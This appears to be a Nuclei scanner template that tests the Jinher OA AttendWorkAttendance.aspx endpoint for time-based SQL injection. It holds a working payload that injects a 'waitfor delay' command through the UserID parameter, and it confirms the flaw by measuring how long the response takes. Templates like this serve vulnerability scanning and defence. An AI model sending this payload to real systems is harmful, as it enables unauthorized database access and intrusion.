id: poc-yaml-jinher-jhsoft-attendworkattendance-aspx-sqli
info:
  name: Jinher OA AttendWorkAttendance.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    A SQL injection vulnerability exists in the Jinher OA AttendWorkAttendance.aspx endpoint, allowing attackers to inject malicious SQL code. The vulnerability can be exploited to execute arbitrary database commands.
variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"
http:
  - raw:
      - |
        GET /c6/Jhsoft.Web.examinenod/AttendWorkAttendance.aspx/?UserID=1'waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "AttendWorkAttendance"
          - "waitfor+delay"
      - type: word
        part: header
        words:
          - "text/html"
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
